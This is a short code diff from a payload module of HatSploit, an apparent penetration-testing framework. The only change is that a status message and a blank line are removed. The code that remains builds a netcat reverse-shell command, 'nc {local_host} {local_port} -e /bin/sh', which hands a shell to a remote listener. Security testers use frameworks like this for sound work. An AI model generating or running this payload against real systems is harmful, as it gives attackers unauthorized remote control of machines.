@@ -45,7 +45,5 @@ class HatSploitPayload(Payload, TCPClient):
     def run(self):
         local_host, local_port = self.parse_options(self.options)
 
-        self.output_process("Generating payload...")
         payload = f"nc {local_host} {local_port} -e /bin/sh"
-
         return payload
